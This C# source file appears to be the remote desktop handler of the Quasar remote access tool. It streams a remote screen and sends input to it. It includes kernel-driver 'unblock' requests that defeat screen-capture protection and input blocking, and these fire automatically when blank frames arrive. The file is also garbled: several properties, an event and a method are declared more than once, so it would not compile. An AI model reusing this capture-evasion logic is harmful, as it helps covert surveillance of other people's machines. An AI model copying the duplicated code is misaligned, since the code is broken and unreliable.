using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Video.Codecs;
using Quasar.Server.Networking;
using System;
using System.Drawing;
using System.IO;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote desktop.
    /// </summary>
    public class RemoteDesktopHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        /// <summary>
        /// States if the client is currently streaming desktop frames.
        /// </summary>
        public bool IsStarted { get; set; }

        /// <summary>
        /// Used in lock statements to synchronize access to <see cref="_codec"/> between UI thread and thread pool.
        /// </summary>
        private readonly object _syncLock = new object();

        /// <summary>
        /// Used in lock statements to synchronize access to <see cref="LocalResolution"/> between UI thread and thread pool.
        /// </summary>
        private readonly object _sizeLock = new object();

        /// <summary>
        /// The local resolution, see <seealso cref="LocalResolution"/>.
        /// </summary>
        private Size _localResolution;

        /// <summary>
        /// The local resolution in width x height. It indicates to which resolution the received frame should be resized.
        /// </summary>
        /// <remarks>
        /// This property is thread-safe.
        /// </remarks>
        public Size LocalResolution
        {
            get
            {
                lock (_sizeLock)
                {
                    return _localResolution;
                }
            }
            set
            {
                lock (_sizeLock)
                {
                    _localResolution = value;
                }
            }
        }

        /// <summary>
        /// <summary>
        /// Determines whether the cursor should be included in captured frames.
        /// </summary>
        public bool IncludeCursor
        {
            get => _includeCursor;
            set => _includeCursor = value;
        }

        /// <summary>
        /// Indicates if each capture request should force an affinity reset on the client.
        /// </summary>
        public bool ForceAffinityReset
        {
            get => _forceAffinityReset;
            set => _forceAffinityReset = value;
        }

        /// <summary>
        /// Represents the method that will handle display changes.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="value">All currently available displays.</param>
        public delegate void DisplaysChangedEventHandler(object sender, int value);

        /// <summary>
        /// Raised when a display changed.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event DisplaysChangedEventHandler DisplaysChanged;

        /// <summary>
        /// Raised whenever the client reports a new kernel driver status.
        /// </summary>
        public event EventHandler<KernelDriverStatusResponse> DriverStatusChanged;

        /// <summary>
        /// Raised after the client replies to a kernel unblock request.
        /// </summary>
        public event EventHandler<KernelUnblockResult> KernelUnblockCompleted;

        /// <summary>
        /// Raised after the client responds to an input unblock request.
        /// </summary>
        public event EventHandler<InputUnblockResult> InputUnblockCompleted;

        /// <summary>
        /// Raised after the client replies to an input unblock request.
        /// </summary>
        public event EventHandler<InputUnblockResult> InputUnblockCompleted;

        /// <summary>
        /// Reports changed displays.
        /// </summary>
        /// <param name="value">All currently available displays.</param>
        private void OnDisplaysChanged(int value)
        {
            SynchronizationContext.Post(val =>
            {
                var handler = DisplaysChanged;
                handler?.Invoke(this, (int)val);
            }, value);
        }

        private void OnDriverStatusChanged(KernelDriverStatusResponse response)
        {
            SynchronizationContext.Post(state =>
            {
                DriverStatusChanged?.Invoke(this, (KernelDriverStatusResponse)state);
            }, response);
        }

        private void OnKernelUnblockCompleted(KernelUnblockResult result)
        {
            SynchronizationContext.Post(state =>
            {
                KernelUnblockCompleted?.Invoke(this, (KernelUnblockResult)state);
            }, result);
        }

        private void OnInputUnblockCompleted(InputUnblockResult result)
        {
            SynchronizationContext.Post(state =>
            {
                InputUnblockCompleted?.Invoke(this, (InputUnblockResult)state);
            }, result);
        }

        private void OnInputUnblockCompleted(InputUnblockResult result)
        {
            SynchronizationContext.Post(state =>
            {
                InputUnblockCompleted?.Invoke(this, (InputUnblockResult)state);
            }, result);
        }

        /// <summary>
        /// The client which is associated with this remote desktop handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// The video stream codec used to decode received frames.
        /// </summary>
        private UnsafeStreamCodec _codec;
        private int _consecutiveBlankFrames;

        private bool _includeCursor = true;
        private bool _forceAffinityReset;
        private bool _requireDriver = true;

        public bool IncludeCursor
        {
            get => _includeCursor;
            set => _includeCursor = value;
        }

        public bool ForceAffinityReset
        {
            get => _forceAffinityReset;
            set => _forceAffinityReset = value;
        }

        /// <summary>
        /// Tracks the last driver state reported by the client.
        /// </summary>
        public KernelDriverState DriverState { get; private set; } = KernelDriverState.Unknown;

        /// <summary>
        /// Tracks the last driver version reported by the client.
        /// </summary>
        public string DriverVersion { get; private set; } = string.Empty;

        /// <summary>
        /// Tracks the last frame id received from the client.
        /// </summary>
        public long LastFrameId { get; private set; }

        /// <summary>
        /// Determines whether captured frames should include the cursor overlay.
        /// </summary>
        public bool IncludeCursor
        {
            get => _includeCursor;
            set => _includeCursor = value;
        }

        /// <summary>
        /// Forces the client to reapply SetWindowDisplayAffinity before capturing.
        /// </summary>
        public bool ForceAffinityReset
        {
            get => _forceAffinityReset;
            set => _forceAffinityReset = value;
        }

        /// <summary>
        /// Indicates if the kernel driver must be running before unblock commands execute.
        /// </summary>
        public bool RequireDriver
        {
            get => _requireDriver;
            set => _requireDriver = value;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="RemoteDesktopHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public RemoteDesktopHandler(Client client) : base(true)
        {
            _client = client;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetDesktopResponse ||
                                                             message is GetMonitorsResponse ||
                                                             message is KernelDriverStatusResponse ||
                                                             message is KernelUnblockResult ||
                                                             message is InputUnblockResult;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetDesktopResponse d:
                    Execute(sender, d);
                    break;
                case GetMonitorsResponse m:
                    Execute(sender, m);
                    break;
                case KernelDriverStatusResponse status:
                    Execute(sender, status);
                    break;
                case KernelUnblockResult result:
                    Execute(sender, result);
                    break;
                case InputUnblockResult inputResult:
                    Execute(sender, inputResult);
                    break;
            }
        }

        /// <summary>
        /// Begins receiving frames from the client using the specified quality and display.
        /// </summary>
        /// <param name="quality">The quality of the remote desktop frames.</param>
        /// <param name="display">The display to receive frames from.</param>
        public void BeginReceiveFrames(int quality, int display)
        {
            lock (_syncLock)
            {
                IsStarted = true;
                _codec?.Dispose();
                _codec = null;
                _client.Send(new GetDesktop
                {
                    CreateNew = true,
                    Quality = quality,
                    DisplayIndex = display,
                    IncludeCursor = _includeCursor,
                    ForceAffinityReset = _forceAffinityReset
                });
            }
        }

        /// <summary>
        /// Sends a kernel unblock request to the client.
        /// </summary>
        /// <param name="processName">Target process name without extension.</param>
        /// <param name="includeChildren">Whether child processes should be inspected.</param>
        /// <param name="driverAction">What the client should do with the kernel driver before executing.</param>
        /// <param name="force">Force execution even if state is degraded.</param>
        public void SendKernelUnblock(string processName, bool includeChildren, bool requireDriver, bool forceResetAffinity, KernelDriverAction driverAction, bool force)
        {
            if (string.IsNullOrWhiteSpace(processName))
                throw new ArgumentException("Process name required.", nameof(processName));

            _client.Send(new DoKernelUnblock
            {
                ProcessName = processName,
                IncludeChildProcesses = includeChildren,
                RequireDriver = requireDriver,
                ForceResetAffinity = forceResetAffinity,
                ExpectedDriverState = DriverState,
                DriverAction = driverAction,
                Force = force
            });
        }

        /// <summary>
        /// Sends an input-unblock request to the client.
        /// </summary>
        public void SendInputUnblock(bool unblockMouse, bool unblockKeyboard, bool forceBlockReset, bool forceHookCleanup)
        {
            _client.Send(new DoInputUnblock
            {
                UnblockMouse = unblockMouse,
                UnblockKeyboard = unblockKeyboard,
                ForceBlockInputReset = forceBlockReset,
                ForceHookCleanup = forceHookCleanup
            });
        }

        /// <summary>
        /// Requests the latest kernel driver state from the client.
        /// </summary>
        /// <param name="driverAction">Optional action to perform while reporting.</param>
        /// <param name="forceRefresh">When true, bypasses cached state.</param>
        public void RequestKernelDriverStatus(KernelDriverAction driverAction = KernelDriverAction.QueryStatus, bool forceRefresh = false)
        {
            _client.Send(new GetKernelDriverStatus
            {
                DriverAction = driverAction,
                ForceRefresh = forceRefresh
            });
        }

        /// <summary>
        /// Ends receiving frames from the client.
        /// </summary>
        public void EndReceiveFrames()
        {
            lock (_syncLock)
            {
                IsStarted = false;
            }
        }

        /// <summary>
        /// Refreshes the available displays of the client.
        /// </summary>
        public void RefreshDisplays()
        {
            _client.Send(new GetMonitors());
        }

        /// <summary>
        /// Sends a mouse event to the specified display of the client.
        /// </summary>
        /// <param name="mouseAction">The mouse action to send.</param>
        /// <param name="isMouseDown">Indicates whether it's a mousedown or mouseup event.</param>
        /// <param name="x">The X-coordinate inside the <see cref="LocalResolution"/>.</param>
        /// <param name="y">The Y-coordinate inside the <see cref="LocalResolution"/>.</param>
        /// <param name="displayIndex">The display to execute the mouse event on.</param>
        public void SendMouseEvent(MouseAction mouseAction, bool isMouseDown, int x, int y, int displayIndex)
        {
            lock (_syncLock)
            {
                _client.Send(new DoMouseEvent
                {
                    Action = mouseAction,
                    IsMouseDown = isMouseDown,
                    // calculate remote width & height
                    X = x * _codec.Resolution.Width / LocalResolution.Width,
                    Y = y * _codec.Resolution.Height / LocalResolution.Height,
                    MonitorIndex = displayIndex
                });
            }
        }

        /// <summary>
        /// Sends a keyboard event to the client.
        /// </summary>
        /// <param name="keyCode">The pressed key.</param>
        /// <param name="keyDown">Indicates whether it's a keydown or keyup event.</param>
        public void SendKeyboardEvent(byte keyCode, bool keyDown)
        {
            _client.Send(new DoKeyboardEvent {Key = keyCode, KeyDown = keyDown});
        }

        private void Execute(ISender client, GetDesktopResponse message)
        {
            lock (_syncLock)
            {
                if (!IsStarted)
                    return;

                LastFrameId = message.FrameId;

                if (message.Image == null || message.Image.Length == 0)
                {
                    HandleBlankFrame(client, message);
                    return;
                }

                _consecutiveBlankFrames = 0;

                if (message.DriverState != KernelDriverState.Unknown && message.DriverState != DriverState)
                {
                    DriverState = message.DriverState;
                    OnDriverStatusChanged(new KernelDriverStatusResponse
                    {
                        State = DriverState,
                        Version = DriverVersion,
                        WatchdogActive = false,
                        Message = message.FrameId > 0 ? $"Reported via frame #{message.FrameId}" : "Reported via frame."
                    });
                }

                if (_codec == null || _codec.ImageQuality != message.Quality || _codec.Monitor != message.Monitor || _codec.Resolution != message.Resolution)
                {
                    _codec?.Dispose();
                    _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
                }

                using (MemoryStream ms = new MemoryStream(message.Image))
                {
                    // create deep copy & resize bitmap to local resolution
                    OnReport(new Bitmap(_codec.DecodeData(ms), LocalResolution));
                }
                
                message.Image = null;

                client.Send(new GetDesktop
                {
                    Quality = message.Quality,
                    DisplayIndex = message.Monitor,
                    IncludeCursor = _includeCursor,
                    ForceAffinityReset = _forceAffinityReset
                });
            }
        }

        private void HandleBlankFrame(ISender client, GetDesktopResponse template)
        {
            _consecutiveBlankFrames++;

            _forceAffinityReset = true;

            foreach (var process in KernelUnblockPresets.ProcessNames)
            {
                try
                {
                    SendKernelUnblock(process, includeChildren: true, requireDriver: _requireDriver, forceResetAffinity: true, driverAction: KernelDriverAction.EnsureRunning, force: true);
                }
                catch
                {
                    // ignore auto recovery errors
                }
            }

            RequestKernelDriverStatus(KernelDriverAction.EnsureRunning, true);

            client.Send(new GetDesktop
            {
                CreateNew = true,
                Quality = template.Quality,
                DisplayIndex = template.Monitor,
                IncludeCursor = _includeCursor,
                ForceAffinityReset = _forceAffinityReset
            });
        }

        private void Execute(ISender client, GetMonitorsResponse message)
        {
            OnDisplaysChanged(message.Number);
        }

        private void Execute(ISender client, KernelDriverStatusResponse message)
        {
            DriverState = message.State;
            DriverVersion = message.Version ?? string.Empty;
            OnDriverStatusChanged(message);
        }

        private void Execute(ISender client, KernelUnblockResult message)
        {
            OnKernelUnblockCompleted(message);
        }

        private void Execute(ISender client, InputUnblockResult message)
        {
            OnInputUnblockCompleted(message);
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    _codec?.Dispose();
                    IsStarted = false;
                }
            }
        }
    }
}
